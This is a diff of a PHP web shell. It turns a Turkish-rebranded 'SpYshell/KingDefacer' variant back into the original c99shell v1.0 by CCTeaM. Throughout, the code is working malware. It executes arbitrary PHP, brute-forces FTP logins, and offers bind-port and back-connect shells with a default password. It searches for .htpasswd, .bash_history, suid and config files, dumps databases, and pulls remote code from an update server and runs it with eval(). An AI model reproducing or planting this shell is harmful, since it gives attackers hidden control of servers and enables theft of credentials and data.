@@ -1,4 +1,51 @@
 <?php
+/*
+******************************************************************************************************
+*
+*					c99shell.php v.1.0 pre-release build #13
+*							Freeware license.
+*								© CCTeaM.
+*  c99shell - ôàéë-ìåíåäæåð ÷åðåç www-áðîóçåð, "çàòî÷åíûé" äëÿ âçëîìà.
+*  Âû ìîæåòå áåñïëàòíî ñêà÷àòü ïîñëåäíþþ âåðñèþ íà äîìàøíåé ñòðàíè÷êå ïðîäóêòà:
+   http://ccteam.ru/releases/c99shell
+*
+*  WEB: http://ccteam.ru
+*  ICQ UIN #: 656555
+*
+*  Îñîáåííîñòè:
+*  + óïðàâëåíèå ëîêàëüíûìè è óäàëåííûìè (ftp, samba) ôàéëàìè/ïàïêàìè, ñîðòèðîâêà
+*    çàêà÷èâàíèå ñêà÷èâàíèå ôàéëîâ è ïàïîê
+*    (ïðåäâîðèòåëüíî óïàêîâûâàåòñÿ/ðàñïàêîâûâàåòñÿ ÷åðåç tar)
+*    ïðîäâèíóòûé ïîèñê (âîçìîæåí âíóòðè ôàéëîâ)
+*    modify-time è access-time ó ôàéëîâ íå ìåíÿþòñÿ ïðè ðåäàêòèðîâàíèè (äëÿ îòêë. ñì $filestealth)
+*  + âûïîëíåíèå ïðîèçâîëüíîãî PHP-êîäà
+*  + êîäèðîâùèê äàííûõ ÷åðåç md5, unix-md5, sha1, crc32, base64
+*  + áûñòðûé ëîêàëüíûé àíàëèç áåçîïàñíîñòè ÎÑ
+*  + áûñòðîå ftp-ñêàíèðîâàíèå íà ñâÿçêè login;login èç /etc/passwd (îáû÷íî äàåò äîñòóï ê 1/100 àêêàóíòîâ)
+*    ïîñòðàíè÷íûé âûâîä, ñîðòèðîâêà, ãðóïïîâûå îïåðàöèè íàä ÁÄ/òàáëèöàìè, óïðàâëåíèå ïðîöåññàìè SQL)
+*  + ñêðèïò "ëþáèò" include: àâòîìàòè÷åñêè èùåò ïåðåìåííûå ñ äåñêðèïòîðàìè è âñòàâëÿåò èõ â ññûëêè (îïöèàëüíî)
+     òàêæå ìîæíî èçìåíèòü $surl (áàçîâàÿ ññûëêà) êàê ÷åðåç êîíôèãóðàöèþ (ïðèíóäèòåëüíî) òàê è ÷åðåç cookie "c99sh_surl",
+     èäåò àâòî-çàïèñü çíà÷åíèÿ $set_surl â cookie "set_surl"
+*  + âîçìîæíîñòü "çàáèíäèòü" /bin/bash íà îïðåäåëåííûé ïîðò ñ ïðîèçâîëüíûì ïàðîëåì,
+*    èëè ñäåëàòü back connect (ïðîèçâîäèòñÿ òåñòèðîâàíèå ñîåäåíåíèÿ, è âûâîäÿòñÿ ïàðàìåòðû äëÿ çàïóñêà NetCat).
+*  + âîçìîæíîñòü áûñòðîãî ñàìî-óäàëåíèÿ ñêðèïòà
+*  + àâòîìàòèçèðîâàíàÿ îòïðàâêà ñîîáùåíèé î íåäîðàáîòêàõ è ïîæåëàíèÿõ àâòîðó (÷åðåç mail())
+*
+*	Ïðèâåäåí äàëåêî íå ïîëíûé ñïèñîê âîçìîæíîñòåé.
+*
+*   Îæèäàåìûå èçìåíåíèÿ:
+*  ~ Ðàçâèòèå sql-ìåíåäæåðà
+*  ~ Äîáàâëåíèå íåäîñòàþùèõ ðàñøèðåíèé ôàéëîâ
+*
+*  ~-~ Ïèøèòå îáî âñåõ íàéäåíûõ íåäîðàáîòêàõ, æåëàåìûõ èçìåíåíèÿõ è äîðàáîòêàõ (äàæå î ñàìûõ íåçíà÷èòåëüíûõ!)
+       â ICQ UIN #656555 ëèáî ÷åðåç ðàçäåë "feedback", áóäóò ðàññìîòðåíû âñå ïðåäëîæåíèÿ è ïîæåëàíèÿ.
+*
+*  Last modify: 29.07.2005
+*
+*  © Captain Crunch Security TeaM. Coded by tristram
+*
+******************************************************************************************************
+*/
 //Starting calls
 if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
 error_reporting(5);
@@ -10,16 +57,16 @@ if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$
 $_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
 foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
 
-$shver = "KingDefacer"; //Current version
+$shver = "1.0 pre-release build #13"; //Current version
 //CONFIGURATION AND SETTINGS
-if (!empty($unset_surl)) {setcookie("ashcoike_surl"); $surl = "";}
-elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("ashcoike_surl",$surl);}
-else {$surl = $_REQUEST["ashcoike_surl"]; //Set this cookie for manual SURL
+if (!empty($unset_surl)) {setcookie("c99sh_surl"); $surl = "";}
+elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("c99sh_surl",$surl);}
+else {$surl = $_REQUEST["c99sh_surl"]; //Set this cookie for manual SURL
 }
 
 $surl_autofill_include = true; //If true then search variables with descriptors (URLs) and save it in SURL.
 
-if ($surl_autofill_include and !$_REQUEST["ashcoike_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
+if ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
 if (empty($surl))
 {
  $surl = "?".$includestr; //Self url
@@ -36,19 +83,19 @@ $md5_pass = ""; //md5-cryped pass. if null, md5($pass)
 
 $host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
 $login_txt = "Restricted area"; //http-auth message.
-$accessdeniedmess = "<a href=\"http://xxxxxxxxxxxxxxxxxxxxxxxx\">SpYshell v.".$shver."</a>: Erisim Engellendi";
+$accessdeniedmess = "<a href=\"http://ccteam.ru/releases/c99shell\">c99shell v.".$shver."</a>: access denied";
 
 $gzipencode = true; //Encode with gzip?
 
 $updatenow = false; //If true, update now (this variable will be false)
 
-$ashsh_updateurl = "http://xxxxxxxxxxxxxxxxxxxxxx"; //Update server
-$ashsh_sourcesurl = "http://xxxxxxxxxxxxxxxxxxxxxxxx"; //Sources-server
+$c99sh_updateurl = "http://ccteam.ru/update/c99shell/"; //Update server
+$c99sh_sourcesurl = "http://ccteam.ru/files/c99sh_sources/"; //Sources-server
 
 $filestealth = true; //if true, don't change modify- and access-time
 
-$donated_html = "<center><b>Powerad By MilitanZ</b></center>";
-		/* If you publish  shell and you wish
+$donated_html = "<center><b>Owned by hacker</b></center>";
+		/* If you publish free shell and you wish
 		add link to your site or any other information,
 		put here your html. */
 $donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.
@@ -57,6 +104,8 @@ $curdir = "./"; //start folder
 //$curdir = getenv("DOCUMENT_ROOT");
 $tmpdir = ""; //Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)
 $tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...)
+
+$log_email = "user@host.tld"; //Default e-mail for sending logs
 
 $sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending
 $sort_save = true; //If true then save sorting-position using cookies.
@@ -116,7 +165,7 @@ $hexdump_rows = 24;	// 16, 24 or 32 bytes in one line
 
 $nixpwdperpage = 100; // Get first N lines from /etc/passwd
 
-$bindport_pass = "ash";	  // default password for binding
+$bindport_pass = "c99";	  // default password for binding
 $bindport_port = "31373"; // default port for binding
 $bc_port = "31373"; // default port for back-connect
 $datapipe_localport = "8081"; // default port for datapipe
@@ -125,60 +174,61 @@ $datapipe_localport = "8081"; // default port for datapipe
 if (!$win)
 {
  $cmdaliases = array(
-  array("-------------------------------------------------------------------", "ls -la"),
-  array("Butun suid dosyalarini bul", "find / -type f -perm -04000 -ls"),
-  array("Butun suid dosyalarini simdiki dizinde bul", "find . -type f -perm -04000 -ls"),
-  array("Butun sgid dosyalarini bul", "find / -type f -perm -02000 -ls"),
-  array("Butun sgid dosyalarini simdiki dizinde bul", "find . -type f -perm -02000 -ls"),
-  array("Butun config.inc.php dosyalarini bul", "find / -type f -name config.inc.php"),
-  array("Butun config* dosyalarini bul", "find / -type f -name \"config*\""),
-  array("Butun config* dosyalarini simdiki dizinde bul", "find . -type f -name \"config*\""),
-  array("Butun yazilabilir dosyalari bul", "find / -perm -2 -ls"),
-  array("Butun dosya ve klasorleri simdiki dizinde bul", "find . -perm -2 -ls"),
-  array("Butun service.pwd doslayalarini bul", "find / -type f -name service.pwd"),
-  array("Butun service.pwd dosyalarini simdiki dizinde bul", "find . -type f -name service.pwd"),
-  array("Butun .htpasswd dosyalarini bul", "find / -type f -name .htpasswd"),
-  array("Butun .htpasswd dosyalarini simdiki dizinde bul", "find . -type f -name .htpasswd"),
-  array("Butun .bash_history dosyalarini bul", "find / -type f -name .bash_history"),
-  array("Butun .bash_history dosyalarini simdiki dizinde bul", "find . -type f -name .bash_history"),
-  array("Butun .fetchmailrc dosyalarini bul", "find / -type f -name .fetchmailrc"),
-  array("Butun .fetchmailrc dosyalarini simdiki dizinde bul", "find . -type f -name .fetchmailrc"),
-  array("Butun Linux ikinci erisebilir dosyalarini bul", "lsattr -va"),
-  array("Butun Acik Portlari goster.", "netstat -an | grep -i listen")
+  array("-----------------------------------------------------------", "ls -la"),
+  array("find all suid files", "find / -type f -perm -04000 -ls"),
+  array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
+  array("find all sgid files", "find / -type f -perm -02000 -ls"),
+  array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
+  array("find config.inc.php files", "find / -type f -name config.inc.php"),
+  array("find config* files", "find / -type f -name \"config*\""),
+  array("find config* files in current dir", "find . -type f -name \"config*\""),
+  array("find all writable folders and files", "find / -perm -2 -ls"),
+  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
+  array("find all service.pwd files", "find / -type f -name service.pwd"),
+  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
+  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
+  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
+  array("find all .bash_history files", "find / -type f -name .bash_history"),
+  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
+  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
+  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
+  array("list file attributes on a Linux second extended file system", "lsattr -va"),
+  array("show opened ports", "netstat -an | grep -i listen")
  );
 }
 else
 {
  $cmdaliases = array(
   array("-----------------------------------------------------------", "dir"),
-  array("Butun Acik Portlari goster.", "netstat -an")
+  array("show opened ports", "netstat -an")
  );
 }
 
-$sess_cookie = "ashshvars"; // Cookie-variable name
+$sess_cookie = "c99shvars"; // Cookie-variable name
 
 $usefsbuff = true; //Buffer-function
 $copy_unset = false; //Remove copied files from buffer after pasting
 
 //Quick launch
 $quicklaunch = array(
- array("<img src=\"".$surl."act=img&img=home\" alt=\"Ana Sayfa\" height=\"20\" width=\"20\" border=\"0\">",$surl),
- array("<img src=\"".$surl."act=img&img=back\" alt=\"Geri\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)"),
- array("<img src=\"".$surl."act=img&img=forward\" alt=\"Ileri\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)"),
- array("<img src=\"".$surl."act=img&img=up\" alt=\"Yukari\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"),
- array("<img src=\"".$surl."act=img&img=refresh\" alt=\"Yenile\" height=\"20\" width=\"17\" border=\"0\">",""),
- array("<img src=\"".$surl."act=img&img=search\" alt=\"Arama\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=search&d=%d"),
- array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Tampon\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=fsbuff&d=%d"),
- array("<b>Cyriptos</b>",$surl."act=encoder&d=%d"),
- array("<b>Araclar</b>",$surl."act=tools&d=%d"),
- array("<b>Islem.</b>",$surl."act=processes&d=%d"),
+ array("<img src=\"".$surl."act=img&img=home\" alt=\"Home\" height=\"20\" width=\"20\" border=\"0\">",$surl),
+ array("<img src=\"".$surl."act=img&img=back\" alt=\"Back\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)"),
+ array("<img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)"),
+ array("<img src=\"".$surl."act=img&img=up\" alt=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"),
+ array("<img src=\"".$surl."act=img&img=refresh\" alt=\"Refresh\" height=\"20\" width=\"17\" border=\"0\">",""),
+ array("<img src=\"".$surl."act=img&img=search\" alt=\"Search\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=search&d=%d"),
+ array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=fsbuff&d=%d"),
+ array("<b>Encoder</b>",$surl."act=encoder&d=%d"),
+ array("<b>Tools</b>",$surl."act=tools&d=%d"),
+ array("<b>Proc.</b>",$surl."act=processes&d=%d"),
  array("<b>FTP brute</b>",$surl."act=ftpquickbrute&d=%d"),
- array("<b>Guvenlik</b>",$surl."act=security&d=%d"),
+ array("<b>Sec.</b>",$surl."act=security&d=%d"),
  array("<b>SQL</b>",$surl."act=sql&d=%d"),
  array("<b>PHP-code</b>",$surl."act=eval&d=%d"),
- array("<b>Bildirim</b>",$surl."act=feedback&d=%d"),
- array("<b>Imha Et</b>",$surl."act=selfremove"),
- array("<b>Exit</b>","#\" onclick=\"if (confirm('Eminmisin dosttum?')) window.close()")
+ array("<b>Update</b>",$surl."act=update&d=%d"),
+ array("<b>Feedback</b>",$surl."act=feedback&d=%d"),
+ array("<b>Self remove</b>",$surl."act=selfremove"),
+ array("<b>Logout</b>","#\" onclick=\"if (confirm('Are you sure?')) window.close()")
 );
 
 //Highlight-code colors
@@ -191,7 +241,7 @@ $highlight_keyword = "#007700";
 $highlight_string = "#000000";
 
 @$f = $_REQUEST["f"];
-@extract($_REQUEST["ashshcook"]);
+@extract($_REQUEST["c99shcook"]);
 
 //END CONFIGURATION
 
@@ -201,15 +251,15 @@ $highlight_string = "#000000";
 $tmp = array();
 foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
 $s = "!^(".implode("|",$tmp).")$!i";
-if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://xxxxxxxxxxxxxxxxxxx\">SpYshell</a>: Erisim Engellendi - Senin Host (".getenv("REMOTE_ADDR").") not allow");}
+if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/cc99shell\">c99shell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
 if (!empty($login))
 {
  if (empty($md5_pass)) {$md5_pass = md5($pass);}
  if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
  {
   if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|<br>"," ",$donated_html));}
-  header("WWW-Belgele: Basic realm=\"SpYshell ".$shver.": ".$login_txt."\"");
-  header("HTTP/1.0 401 Yetkisiz");
+  header("WWW-Authenticate: Basic realm=\"c99shell ".$shver.": ".$login_txt."\"");
+  header("HTTP/1.0 401 Unauthorized");
   exit($accessdeniedmess);
  }
 }
@@ -217,7 +267,7 @@ if ($act != "img")
 {
 $lastdir = realpath(".");
 chdir($curdir);
-if ($selfwrite or $updatenow) {@ob_clean(); ashsh_getupdate($selfwrite,1); exit;}
+if ($selfwrite or $updatenow) {@ob_clean(); c99sh_getupdate($selfwrite,1); exit;}
 $sess_data = unserialize($_COOKIE["$sess_cookie"]);
 if (!is_array($sess_data)) {$sess_data = array();}
 if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
@@ -230,9 +280,9 @@ if (!empty($disablefunc))
  $disablefunc = explode(",",$disablefunc);
 }
 
-if (!function_exists("ash_buff_prepare"))
+if (!function_exists("c99_buff_prepare"))
 {
-function ash_buff_prepare()
+function c99_buff_prepare()
 {
  global $sess_data;
  global $act;
@@ -246,14 +296,14 @@ function ash_buff_prepare()
  else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
 }
 }
-ash_buff_prepare();
-if (!function_exists("ash_sess_put"))
+c99_buff_prepare();
+if (!function_exists("c99_sess_put"))
 {
-function ash_sess_put($data)
+function c99_sess_put($data)
 {
  global $sess_cookie;
  global $sess_data;
- ash_buff_prepare();
+ c99_buff_prepare();
  $sess_data = $data;
  $data = serialize($data);
  setcookie($sess_cookie,$data);
@@ -443,17 +493,17 @@ function view_perms($mode)
 
  $owner["read"] = ($mode & 00400)?"r":"-";
  $owner["write"] = ($mode & 00200)?"w":"-";
- $owner["Uygulanamadi!"] = ($mode & 00100)?"x":"-";
+ $owner["execute"] = ($mode & 00100)?"x":"-";
  $group["read"] = ($mode & 00040)?"r":"-";
  $group["write"] = ($mode & 00020)?"w":"-";
- $group["Uygulanamadi!"] = ($mode & 00010)?"x":"-";
+ $group["execute"] = ($mode & 00010)?"x":"-";
  $world["read"] = ($mode & 00004)?"r":"-";
  $world["write"] = ($mode & 00002)? "w":"-";
- $world["Uygulanamadi!"] = ($mode & 00001)?"x":"-";
+ $world["execute"] = ($mode & 00001)?"x":"-";
 
- if ($mode & 0x800) {$owner["Uygulanamadi!"] = ($owner["Uygulanamadi!"] == "x")?"s":"S";}
- if ($mode & 0x400) {$group["Uygulanamadi!"] = ($group["Uygulanamadi!"] == "x")?"s":"S";}
- if ($mode & 0x200) {$world["Uygulanamadi!"] = ($world["Uygulanamadi!"] == "x")?"t":"T";}
+ if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
+ if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
+ if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}
 
  return $type.join("",$owner).join("",$group).join("",$world);
 }
@@ -498,37 +548,37 @@ function view_perms_color($o)
  else {return "<font color=green>".view_perms(fileperms($o))."</font>";}
 }
 }
-if (!function_exists("ashgetsource"))
+if (!function_exists("c99getsource"))
 {
-function ashgetsource($fn)
+function c99getsource($fn)
 {
- global $ashsh_sourcesurl;
+ global $c99sh_sourcesurl;
  $array = array(
-  "ashsh_bindport.pl" => "ashsh_bindport_pl.txt",
-  "ashsh_bindport.c" => "ashsh_bindport_c.txt",
-  "ashsh_backconn.pl" => "ashsh_backconn_pl.txt",
-  "ashsh_backconn.c" => "ashsh_backconn_c.txt",
-  "ashsh_datapipe.pl" => "ashsh_datapipe_pl.txt",
-  "ashsh_datapipe.c" => "ashsh_datapipe_c.txt",
+  "c99sh_bindport.pl" => "c99sh_bindport_pl.txt",
+  "c99sh_bindport.c" => "c99sh_bindport_c.txt",
+  "c99sh_backconn.pl" => "c99sh_backconn_pl.txt",
+  "c99sh_backconn.c" => "c99sh_backconn_c.txt",
+  "c99sh_datapipe.pl" => "c99sh_datapipe_pl.txt",
+  "c99sh_datapipe.c" => "c99sh_datapipe_c.txt",
  );
  $name = $array[$fn];
- if ($name) {return file_get_contents($ashsh_sourcesurl.$name);}
+ if ($name) {return file_get_contents($c99sh_sourcesurl.$name);}
  else {return false;}
 }
 }
-if (!function_exists("ashsh_getupdate"))
+if (!function_exists("c99sh_getupdate"))
 {
-function ashsh_getupdate($update = true)
+function c99sh_getupdate($update = true)
 {
- $url = $GLOBALS["ashsh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
+ $url = $GLOBALS["c99sh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
  $data = @file_get_contents($url);
- if (!$data) {return "Server guncellestirme baglanamadi!";}
+ if (!$data) {return "Can't connect to update-server!";}
  else
  {
   $data = ltrim($data);
   $string = substr($data,3,ord($data{2}));
-  if ($data{0} == "\x99" and $data{1} == "\x01") {return "Hatta: ".$string; return false;}
-  if ($data{0} == "\x99" and $data{1} == "\x02") {return "En son guncellestirmeyi kullaniyosun!";}
+  if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return false;}
+  if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";}
   if ($data{0} == "\x99" and $data{1} == "\x03")
   {
    $string = explode("\x01",$string);
@@ -541,14 +591,14 @@ function ashsh_getupdate($update = true)
     else
     {
      $fp = fopen(__FILE__,"w");
-     if (!$fp) {return "Yerel Hata: Guncelestirme yazilamadi".__FILE__."! Sen Spyhackerz.com girip birseyler grenebilirsin. <a href=\"".$sourceurl."\"><u>here</u></a>.";}
-     else {fwrite($fp,$source); fclose($fp); return "Tesekkurler Guncellendi!";}
+     if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download c99shell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
+     else {fwrite($fp,$source); fclose($fp); return "Thanks! Updated with success.";}
     }
    }
-   else {return "Yeni Versiyon bulundu: ".$string[1];}
+   else {return "New version are available: ".$string[1];}
   }
   elseif ($data{0} == "\x99" and $data{1} == "\x04") {eval($string); return 1;}
-  else {return "protocol hata: bolum engellendi! (".$data.") ";}
+  else {return "Error in protocol: segmentation failed! (".$data.") ";}
  }
 }
 }
@@ -567,7 +617,7 @@ function mysql_dump($set)
  $onlytabs = $set["onlytabs"];
  $ret = array();
  $ret["err"] = array();
- if (!is_resource($sock)) {echo("Hata: \$sock Dogrulamadi");}
+ if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
  if (empty($db)) {$db = "db";}
  if (empty($print)) {$print = 0;}
  if (empty($nl2br)) {$nl2br = 0;}
@@ -584,11 +634,12 @@ function mysql_dump($set)
   $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
   if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
  }
- $out = "# Dumped by SpYShell.SQL ".$shver."
-# Ana Sayfa: http://www.spyhackerz.com/
-# Host ayarlari:
-# MySQL versiyon: (".mysql_get_server_info().") Su an calisan ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
-# Tarih: ".date("d.m.Y H:i:s")."
+ $out = "# Dumped by C99Shell.SQL v. ".$shver."
+# Home page: http://ccteam.ru
+#
+# Host settings:
+# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
+# Date: ".date("d.m.Y H:i:s")."
 # DB: \"".$db."\"
 #---------------------------------------------------------
 ";
@@ -597,16 +648,16 @@ function mysql_dump($set)
  {
   if ((in_array($tab,$onlytabs)) or (!$c))
   {
-   if ($add_drop) {$out .= "Ekle Table , exits `".$tab."`;\n";}
-   // recieve query for Olustur table structure
-   $res = mysql_query("Olusan tabloyu goster `".$tab."`", $sock);
+   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
+   // recieve query for create table structure
+   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
    if (!$res) {$ret["err"][] = mysql_smarterror();}
    else
    {
     $row = mysql_fetch_row($res);
     $out .= $row["1"].";\n\n";
     // recieve table variables
-    $res = mysql_query("Sec * FROM `$tab`", $sock);
+    $res = mysql_query("SELECT * FROM `$tab`", $sock);
     if (mysql_num_rows($res) > 0)
     {
      while ($row = mysql_fetch_assoc($res))
@@ -615,7 +666,7 @@ function mysql_dump($set)
       $values = array_values($row);
       foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
       $values = implode("', '", $values);
-      $sql = "Icine Sok `$tab`(`".$keys."`) VALUES ('".$values."');\n";
+      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
       $out .= $sql;
      }
     }
@@ -686,11 +737,11 @@ function mysql_query_form()
  if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
  if ((!$submit) or ($sql_act))
  {
-  echo "<table border=0><tr><td><form name=\"ashsh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Gercekden eminmisin ? :)";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Evet\">&nbsp;<input type=submit value=\"Hayir\"></form></td>";
+  echo "<table border=0><tr><td><form name=\"c99sh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\">&nbsp;<input type=submit value=\"No\"></form></td>";
   if ($tbl_struct)
   {
-   echo "<td valign=\"top\"><b>Alanlar:</b><br>";
-   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo " <a href=\"#\" onclick=\"document.ashsh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
+   echo "<td valign=\"top\"><b>Fields:</b><br>";
+   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "» <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
    echo "</td></tr></table>";
   }
  }
@@ -701,7 +752,7 @@ if (!function_exists("mysql_create_db"))
 {
 function mysql_create_db($db,$sock="")
 {
- $sql = "DATABASE OLUSTUR `".addslashes($db)."`;";
+ $sql = "CREATE DATABASE `".addslashes($db)."`;";
  if ($sock) {return mysql_query($sql,$sock);}
  else {return mysql_query($sql);}
 }
@@ -752,9 +803,9 @@ function mysql_query_parse($query)
  else {return false;}
 }
 }
-if (!function_exists("ashfsearch"))
+if (!function_exists("c99fsearch"))
 {
-function ashfsearch($d)
+function c99fsearch($d)
 {
  global $found;
  global $found_d;
@@ -773,7 +824,7 @@ function ashfsearch($d)
    {
     $search_i_d++;
     if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
-    if (!is_link($d.$f)) {ashfsearch($d.$f);}
+    if (!is_link($d.$f)) {c99fsearch($d.$f);}
    }
    else
    {
@@ -814,16 +865,16 @@ function onphpshutdown()
   @ob_end_flush();
  }
 }
-function ashshexit()
+function c99shexit()
 {
  onphpshutdown();
  exit;
 }
-header("Zamani: Mon, 12 May 2005 03:00:00 GMT");
-header("Son Modifiye: ".gmdate("D, d M Y H:i:s")." GMT");
+header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
+header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
 header("Cache-Control: no-store, no-cache, must-revalidate");
 header("Cache-Control: post-check=0, pre-check=0", false);
-header("Pratik: no-cache");
+header("Pragma: no-cache");
 if (empty($tmpdir))
 {
  $tmpdir = ini_get("upload_tmp_dir");
@@ -837,12 +888,12 @@ else {$tmpdir_logs = realpath($tmpdir_logs);}
 if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
 {
  $safemode = true;
- $hsafemode = "<font color=red>ACiK (Guvenlikli) :( </font>";
+ $hsafemode = "<font color=red>ON (secure)</font>";
 }
-else {$safemode = false; $hsafemode = "<font color=green>Kapali (guvenlik yok)</font>";}
+else {$safemode = false; $hsafemode = "<font color=green>OFF (not secure)</font>";}
 $v = @ini_get("open_basedir");
 if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=red>".$v."</font>";}
-else {$openbasedir = false; $hopenbasedir = "<font color=green>Kapali (guvenlik yok)</font>";}
+else {$openbasedir = false; $hopenbasedir = "<font color=green>OFF (not secure)</font>";}
 $sort = htmlspecialchars($sort);
 if (empty($sort)) {$sort = $sort_default;}
 $sort[1] = strtolower($sort[1]);
@@ -859,23 +910,7 @@ if (!is_array($actbox)) {$actbox = array();}
 $dspact = $act = htmlspecialchars($act);
 $disp_fullpath = $ls_arr = $notls = null;
 $ud = urlencode($d);
-?>
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us">
-<title><?php echo getenv("HTTP_HOST"); ?> c99shell - Edited By KingDefacer</title>
-<script>
